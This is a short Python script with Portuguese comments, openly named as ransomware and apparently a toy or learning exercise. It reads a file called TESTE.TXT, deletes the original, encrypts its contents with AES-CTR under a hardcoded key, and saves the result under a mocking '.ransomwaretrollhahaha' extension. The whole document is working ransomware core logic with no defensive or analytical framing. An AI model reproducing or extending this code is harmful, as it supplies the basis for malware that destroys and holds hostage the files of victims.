import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = "TESTE.TXT"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia (tamanho 16 bytes)
key = b"testeransomware1"  # Possui exatamente 16 bytes
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + ".ransomwaretrollhahaha"
with open(new_file, "wb") as encrypted_file:
    encrypted_file.write(crypto_data)

print(f"Arquivo {file_name} criptografado com sucesso!")
